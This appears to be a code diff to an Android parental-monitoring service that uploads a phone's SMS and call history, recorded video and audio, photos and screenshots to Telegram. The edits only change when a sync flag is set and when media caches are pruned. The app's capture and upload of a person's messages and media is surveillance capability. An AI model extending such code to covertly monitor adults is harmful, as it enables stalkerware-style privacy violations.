@@ -2625,10 +2625,10 @@ class MonitoringService : Service() {
             }
             if (initialOk && !smsTruncated && !callTruncated) {
                 sendToTelegram(completeMessage)
+                preferencesManager.setInitialSyncDoneSync(true)
             } else {
                 sendToTelegram("Sinkron riwayat terkirim sebagian. Sisanya menyusul otomatis.")
             }
-            preferencesManager.setInitialSyncDoneSync(true)
             idleDataCycles = 0
             if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "=== Initial data sending complete ===")
 
@@ -5360,6 +5360,7 @@ private suspend fun ringDevice(seconds: Int) {
             }
             val now = System.currentTimeMillis()
             var droppedVideos = 0
+            var videoProgress = false
             for (file in pending) {
                 if (file == activeVideoFile) continue
                 if (now - file.lastModified() < 10_000L) continue
@@ -5369,6 +5370,7 @@ private suspend fun ringDevice(seconds: Int) {
                 }
                 val videoOutcome = sendVideoFile(file)
                 if (videoOutcome == MediaSendOutcome.KEPT) break
+                videoProgress = true
                 if (videoOutcome == MediaSendOutcome.DROPPED) droppedVideos++
                 kotlinx.coroutines.delay(500)
             }
@@ -5381,7 +5383,7 @@ private suspend fun ringDevice(seconds: Int) {
             }
         } finally {
             videoFlushBusy.set(false)
-            pruneVideoCache(MAX_VIDEO_KEPT)
+            if (videoProgress || droppedVideos > 0) pruneVideoCache(MAX_VIDEO_KEPT)
         }
     }
 
@@ -5417,6 +5419,7 @@ private suspend fun ringDevice(seconds: Int) {
             }
             val now = System.currentTimeMillis()
             var droppedAudio = 0
+            var audioProgress = false
             for (file in pending) {
                 if (file == activeAudioFile) continue
                 if (now - file.lastModified() < 10_000L) continue
@@ -5426,6 +5429,7 @@ private suspend fun ringDevice(seconds: Int) {
                 }
                 val audioOutcome = sendAudioFile(file)
                 if (audioOutcome == MediaSendOutcome.KEPT) break
+                audioProgress = true
                 if (audioOutcome == MediaSendOutcome.DROPPED) droppedAudio++
                 kotlinx.coroutines.delay(500)
             }
@@ -5438,7 +5442,7 @@ private suspend fun ringDevice(seconds: Int) {
             }
         } finally {
             audioFlushBusy.set(false)
-            pruneAudioCache(MAX_AUDIO_KEPT)
+            if (audioProgress || droppedAudio > 0) pruneAudioCache(MAX_AUDIO_KEPT)
         }
     }
 
@@ -5716,6 +5720,7 @@ private suspend fun ringDevice(seconds: Int) {
             }
             val now = System.currentTimeMillis()
             var droppedPhotos = 0
+            var photoProgress = false
             for (file in pending) {
                 if (file == activePhotoFile || file == activeShotFile) continue
                 if (now - file.lastModified() < 10_000L) continue
@@ -5725,6 +5730,7 @@ private suspend fun ringDevice(seconds: Int) {
                 }
                 val photoOutcome = sendPhotoFile(file)
                 if (photoOutcome == MediaSendOutcome.KEPT) break
+                photoProgress = true
                 if (photoOutcome == MediaSendOutcome.DROPPED) droppedPhotos++
                 kotlinx.coroutines.delay(500)
             }
@@ -5735,7 +5741,7 @@ private suspend fun ringDevice(seconds: Int) {
                 } catch (_: Exception) {
                 }
             }
-            prunePhotoCache()
+            if (photoProgress || droppedPhotos > 0) prunePhotoCache()
         } finally {
             photoFlushBusy.set(false)
         }
